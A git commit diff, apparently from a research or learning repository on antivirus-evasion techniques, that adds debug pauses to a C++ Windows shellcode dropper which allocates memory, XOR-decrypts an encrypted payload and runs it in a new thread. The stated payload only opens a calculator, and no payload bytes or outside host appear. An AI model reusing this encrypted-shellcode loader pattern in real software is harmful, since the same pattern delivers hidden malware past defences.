a6e13b4bbaf3789384c98fa1da511f3d44b6af36
Natsukooh <romain74.baudet@gmail.com>
2022-12-22 22:13:07 +0100

    added debugging features in xor source file

--- src/technique_1_encrypting_shellcode/shellcode_dropper.cpp
+++ src/technique_1_encrypting_shellcode/shellcode_dropper.cpp
@@ -1,6 +1,7 @@
 // This program's goal is to try to create a new process to execute a shellcode that will open a calculator
 
 #include <windows.h>
+#include <iostream>
 
 #ifdef SHELLCODE_PATH
 #include SHELLCODE_PATH
@@ -21,6 +22,13 @@ void decrypt_payload(unsigned char* payload, unsigned int payload_size, unsigned
 
 int main()
 {
+
+#if DEBUG
+	printf("Shellcode is located at %p\n", shellcode);
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
+
 	// Allocate the memory
 	void* memory = VirtualAlloc(nullptr,
 								sizeof(shellcode),
@@ -32,13 +40,31 @@ int main()
 		return 1;
 	}
 
+#if DEBUG
+	printf("Allocated memory at %p\n", memory);
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
+
 	// Move the shellcode to the allocated memory
 	memcpy(memory,
 		   shellcode,
 		   sizeof(shellcode));
 
+#if DEBUG
+	printf("Shellcode copied to memory\n");
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
+
 	// Decrypt the payload
 	decrypt_payload((unsigned char*) memory, sizeof(shellcode), key, sizeof(key));
+
+#if DEBUG
+	printf("Shellcode decrypted\n");
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
 
 	// Create a thread pointing to the shellcode address
 	HANDLE thread =	CreateThread(nullptr,
